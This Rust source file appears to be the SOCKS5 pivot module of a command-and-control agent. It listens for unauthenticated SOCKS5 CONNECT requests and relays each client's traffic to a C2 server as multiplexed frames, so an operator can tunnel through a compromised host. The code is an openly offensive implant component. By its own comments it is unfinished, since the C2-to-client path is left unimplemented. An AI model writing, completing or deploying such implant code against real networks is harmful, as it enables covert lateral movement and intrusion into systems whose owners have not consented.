use tokio::net::{TcpListener, TcpStream};
use tokio::sync::mpsc;
use crate::networking::socks5_pivot::{PivotFrame, Socks5PivotHandler};
use std::sync::Arc;
use log::{info, error};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::sync::atomic::{AtomicU32, Ordering};
use std::net::Ipv4Addr;
use tokio::sync::Mutex;

pub struct Socks5PivotServer {
    listen_addr: String,
    listen_port: u16,
    pivot_tx: mpsc::Sender<PivotFrame>,
}

// Socks5PivotServer implements a SOCKS5 proxy server that relays connections to a C2 server.
impl Socks5PivotServer {
    pub fn new(listen_addr: String, listen_port: u16, pivot_tx: mpsc::Sender<PivotFrame>) -> Self {
        Self { listen_addr, listen_port, pivot_tx }
    }

    pub async fn run(self, pivot_handler: Arc<tokio::sync::Mutex<Socks5PivotHandler>>) {
        let addr = format!("{}:{}", self.listen_addr, self.listen_port);
        
        let listener = match TcpListener::bind(&addr).await {
            Ok(listener) => {
                info!("[SOCKS5-PIVOT] Listening on {}", addr);
                listener
            }
            Err(e) => {
                error!("[SOCKS5-PIVOT] Failed to bind to {}: {}. SOCKS5 pivot disabled.", addr, e);
                error!("[SOCKS5-PIVOT] This is not fatal - agent continues without pivot capability.");
                // Return gracefully instead of panicking
                return;
            }
        };

        loop {
            match listener.accept().await {
                Ok((stream, _)) => {
                    info!("[SOCKS5-PIVOT] New SOCKS5 client connection");
                    let pivot_tx = self.pivot_tx.clone();
                    let handler = pivot_handler.clone();
                    tokio::spawn(async move {
                        if let Err(e) = handle_socks5_client(stream, pivot_tx, handler).await {
                            error!("[SOCKS5-PIVOT] Client error: {:?}", e);
                        }
                    });
                }
                Err(e) => error!("[SOCKS5-PIVOT] Accept error: {:?}", e),
            }
        }
    }
}

static STREAM_ID_COUNTER: AtomicU32 = AtomicU32::new(1);

async fn handle_socks5_client(
    mut stream: TcpStream,
    pivot_tx: mpsc::Sender<PivotFrame>,
    pivot_handler: Arc<tokio::sync::Mutex<Socks5PivotHandler>>,
) -> Result<(), Box<dyn std::error::Error>> {
    // 1. SOCKS5 handshake (no authentication)
    let mut buf = [0u8; 2];
    stream.read_exact(&mut buf).await?;
    if buf[0] != 0x05 {
        return Err("Unsupported SOCKS version".into());
    }
    let n_methods = buf[1] as usize;
    let mut methods = vec![0u8; n_methods];
    stream.read_exact(&mut methods).await?;
    // Reply: version 5, no authentication (0x00)
    stream.write_all(&[0x05, 0x00]).await?;
    info!("[SOCKS5-PIVOT] SOCKS5 handshake complete");

    // 2. Parse CONNECT request
    let mut header = [0u8; 4];
    stream.read_exact(&mut header).await?;
    if header[0] != 0x05 || header[1] != 0x01 {
        return Err("Only SOCKS5 CONNECT supported".into());
    }
    let addr = match header[3] {
        0x01 => { // IPv4
            let mut ip = [0u8; 4];
            stream.read_exact(&mut ip).await?;
            let mut port = [0u8; 2];
            stream.read_exact(&mut port).await?;
            let ip = Ipv4Addr::from(ip);
            let port = u16::from_be_bytes(port);
            format!("{}:{}", ip, port)
        }
        0x03 => { // Domain
            let mut len = [0u8; 1];
            stream.read_exact(&mut len).await?;
            let mut domain = vec![0u8; len[0] as usize];
            stream.read_exact(&mut domain).await?;
            let mut port = [0u8; 2];
            stream.read_exact(&mut port).await?;
            let domain = String::from_utf8(domain)?;
            let port = u16::from_be_bytes(port);
            format!("{}:{}", domain, port)
        }
        _ => return Err("Unsupported address type".into()),
    };

    // 3. Assign unique stream ID
    let stream_id = STREAM_ID_COUNTER.fetch_add(1, Ordering::Relaxed);
    info!("[SOCKS5-PIVOT] CONNECT to {} (stream_id={})", addr, stream_id);

    // 4. Send PivotFrame::Open to C2
    let open_frame = PivotFrame::open(stream_id, addr.clone());
    pivot_tx.send(open_frame).await?;
    info!("[SOCKS5-PIVOT] Sent PivotFrame::Open for stream_id {}", stream_id);

    // 5. Reply to client: success
    // Version, success, reserved, address type, bind addr/port (dummy)
    let reply = [0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0];
    stream.write_all(&reply).await?;

    // 6. Register stream with handler for multiplexing
    let (mut reader, writer) = stream.into_split();{
        let mut handler = pivot_handler.lock().await;
        handler.register_stream(stream_id, Arc::new(Mutex::new(writer)));
    }

    let c2_sender = pivot_tx.clone();

    let _read_task = tokio::spawn(async move {
        let mut buf = [0u8; 4096];
        loop {
            match reader.read(&mut buf).await {
                Ok(0) => {
                    log::info!("[SOCKS5-PIVOT] Client closed connection (stream_id={})", stream_id);
                    break;
                }
                Ok(n) => {
                    log::debug!("[SOCKS5-PIVOT] Read {} bytes from SOCKS5 client (stream_id={})", n, stream_id);
                    let frame = PivotFrame::data(stream_id, buf[..n].to_vec());
                    if c2_sender.send(frame).await.is_err() {
                        log::warn!("[SOCKS5-PIVOT] Failed to send data frame to C2 (stream_id={})", stream_id);
                        break;
                    }
                }
                Err(e) => {
                    log::error!("[SOCKS5-PIVOT] Error reading from client (stream_id={}): {:?}", stream_id, e);
                    break;
                }
            }
        }
        let _ = c2_sender.send(PivotFrame::close(stream_id)).await;
        log::info!("[SOCKS5-PIVOT] Sent close frame to C2 (stream_id={})", stream_id);
    });
    info!("[SOCKS5-PIVOT] Started relay for stream_id {}", stream_id);

    // Task: Wait for relay to finish (optional: handle C2->client in handler)
    // Need to implement logic in Socks5PivotHandler::handle_frame
    // to write incoming C2 data to the correct stream.

    info!("[SOCKS5-PIVOT] Opened stream {} to {}", stream_id, addr);

    Ok(())
}